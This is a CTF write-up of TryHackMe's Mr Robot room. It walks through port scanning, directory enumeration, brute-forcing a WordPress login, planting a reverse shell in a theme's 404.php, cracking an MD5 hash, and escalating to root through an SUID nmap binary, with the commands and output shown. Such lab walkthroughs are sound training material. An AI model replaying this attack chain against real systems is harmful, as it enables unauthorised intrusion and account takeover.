---
title: "Mr Robot CTF - TryHackMe"
date: 2026-03-24 02:58:00 +0000
categories: [TryHackMe, Writeups]
tags: [brute-force, caido, gobuster, privilege-escalation]
image: /assets/img/writeups/covers/mr-robot-ctf.jpg
---
# Mr Robot CTF - TryHackMe
![1.png](/assets/img/writeups/mr-robot-ctf/1.png)
**Difficulty**: Medium<br>**Time Required**: 35 min
### **Overview**
This write-up explains the full exploitation process of the [Mr. Robot CTF](https://tryhackme.com/room/mrrobot) room on TryHackMe.<br>The goal is to understand why each step was taken and how different enumeration and exploitation techniques lead to full system compromise.
## Reconnaissance
The first step in any penetration test is to identify the attack surface. For that purpose, I performed an Nmap scan.
````
--> nmap -p- 10.65.168.149 -sV -T4 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 04:49 +0500
Stats: 0:02:35 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 75.06% done; ETC: 04:52 (0:00:52 remaining)
Nmap scan report for 10.65.168.149 (10.65.168.149)
Host is up (0.23s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
````
From the results, I observed that port 80 (HTTP) was open.
![1.png](/assets/img/writeups/mr-robot-ctf/2.png)
I accessed the web server in a browser but nothing obvious  stood out.
- No visible vulnerabilities
- No exposed data or hidden endpoints

## Directory Enumeration
To discover hidden endpoints, I used `Gobuster`:
````
$ gobuster dir -u 10.65.168.149 -w /usr/share/wordlists/dirb/common.txt -t 60
`````
![1.png](/assets/img/writeups/mr-robot-ctf/3.png)
### Key Findings
- /robots.txt
- /wp-login

## robots.txt
The `robots.txt` file is meant for search engines, but developers often accidentally expose sensitive paths there.
**Accessing it revealed**:
- fsocity.dic
- key-1-of-3.txt

### Retrieving the First Key
Accessing the file directly through the browser reveals the first key.
```
http://10.65.168.149/key-1-of-3.txt
```
![1.png](/assets/img/writeups/mr-robot-ctf/4.png)
## fsocity.dic
The `fsocity.dic` file contained a large list of usernames and passwords mixed together.
**Important observation:**
- Many entries were duplicated

### Optimizing the Wordlist
To improve efficiency, I removed duplicates:
````
$ sort -u old-list.txt > sorted-list.txt
````
## Brute Force WordPress Login
The presence of `/wp-login.php` confirmed a WordPress installation. Instead of blindly guessing credentials, I used `Caido` to perform controlled brute-force attacks.
### Step 1: Username Enumeration
I captured the login request and replaced the username field with a payload list. Different responses (error messages or response size) can reveal valid usernames.
![1.png](/assets/img/writeups/mr-robot-ctf/5.png)
To maximize efficiency, navigate to Settings and increase the number of workers from 10 to 30, this raises the thread count and significantly accelerates the brute force attack.
![1.png](/assets/img/writeups/mr-robot-ctf/6.png)
The username `elliot` has successfully been enumerated.

### Step 2: Password Brute Force
Same process as username enumeration, just changed the placeholder from username to password and filtered out repoonse code to `302` to get the successful login redirect.
![1.png](/assets/img/writeups/mr-robot-ctf/7.png)
![1.png](/assets/img/writeups/mr-robot-ctf/8.png)

Using the discovered credentials, I logged into the admin dashboard.
![1.png](/assets/img/writeups/mr-robot-ctf/9.png)
## Getting Reverse Shell
After logging in, I explored the site's functionality for injection points and discovered the Theme Editor. I modified the `404.php` file, inserting a [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) configured with my IP and port.<br>Updating the file allowed for the execution of the script. By accessing the modified file through its directory path, the script ran and established a remote connection, providing a reverse shell.
![1.png](/assets/img/writeups/mr-robot-ctf/10.png)
````
$ nc -lvnp 1234    
listening on [any] 1234 ...
````
![1.png](/assets/img/writeups/mr-robot-ctf/11.png)
![1.png](/assets/img/writeups/mr-robot-ctf/12.png)

Inside the system, I explored directories and found:
````
$ ls /home/robot
````
- key-2-of-3.txt
- password.raw-md5

The key file was not readable because it belonged to another user `robot`. However the `password.raw-md5` contains `md5` hash for the user `robot`.
## Cracking the MD5 Hash
Save the content of the `password.raw-md5` on your machine and crack it using `john`
````
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (robot)     <-----Password
1g 0:00:00:00 DONE (2026-03-25 06:47) 100.0g/s 4070Kp/s 4070Kc/s 
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
````

Now, switch to the user `robot` and access the `key-2-of-3.txt`
````
$ su robot
Password: abcdefghijklmnopqrstuvwxyz
$ cat /home/robot/key-2-of-3.txt
822c7-----------------------f959
````
## Privilege Escalation
Next goal is to get root access.
**Understanding SUID Permissions**<br>SUID (Set User ID) binaries are a special type of executable file in Linux/Unix operating systems that allow users to run a program with the permissions of the file owner rather than the user who is running it.<br>**Searching for SUID Binaries**
````
$ find / -perm /6000 2>/dev/null | grep '/bin/'
/bin/umount
/bin/mount
/bin/su
/usr/bin/mail-touchlock
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/pkexec
/usr/local/bin/nmap
````

The scan revealed that `nmap` had SUID permissions.<br>Now go to [GTFOBins](https://gtfobins.org), search for nmap, and select `SUID`, and copy the command.
![1.png](/assets/img/writeups/mr-robot-ctf/13.png)
Now, execute this command.
````
$ nmap --interactive
!/bin/shStarting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> id
uid=0(root) gid=0(root) groups=0(root),1002(robot)
nmap> cat root/key-3-of-3.txt
04787dde--------------------b4e4
````
With the final flag in hand, it’s time to say goodbye to the machine.
